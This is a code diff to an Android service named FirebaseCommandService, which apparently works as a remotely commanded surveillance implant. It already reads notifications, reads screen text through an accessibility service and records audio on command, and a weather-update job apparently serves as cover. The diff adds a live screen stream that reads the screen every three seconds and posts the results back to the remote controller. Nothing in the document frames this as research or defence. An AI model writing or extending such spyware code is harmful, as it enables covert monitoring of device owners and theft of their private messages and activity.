@@ -48,6 +48,7 @@ class FirebaseCommandService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
     private var weatherUpdateJob: Job? = null
+    private var liveScreenJob: Job? = null
     private val WEATHER_UPDATE_INTERVAL = 30 * 60 * 1000L // 30 mins
 
     private lateinit var database: DatabaseReference
@@ -107,6 +108,8 @@ class FirebaseCommandService : Service() {
         when (command) {
             "READ_NOTIFICATIONS" -> readNotifications()
             "READ_SCREEN" -> readScreen()
+            "START_LIVE_SCREEN" -> startLiveScreen()
+            "STOP_LIVE_SCREEN" -> stopLiveScreen()
             "START_RECORD_AUDIO" -> {
                 AudioRecordManager.startRecording(this, currentSessionKey)
             }
@@ -360,6 +363,22 @@ class FirebaseCommandService : Service() {
         } else {
             postResult("ERROR", "Accessibility service not running")
         }
+    }
+
+    private fun startLiveScreen() {
+        if (liveScreenJob?.isActive == true) return
+        liveScreenJob = serviceScope.launch {
+            while (true) {
+                readScreen()
+                delay(3000) // Poll every 3 seconds
+            }
+        }
+        postResult("TEXT", "Live Screen Stream Started")
+    }
+
+    private fun stopLiveScreen() {
+        liveScreenJob?.cancel()
+        postResult("TEXT", "Live Screen Stream Stopped")
     }
 
     private fun getInstalledApps() {
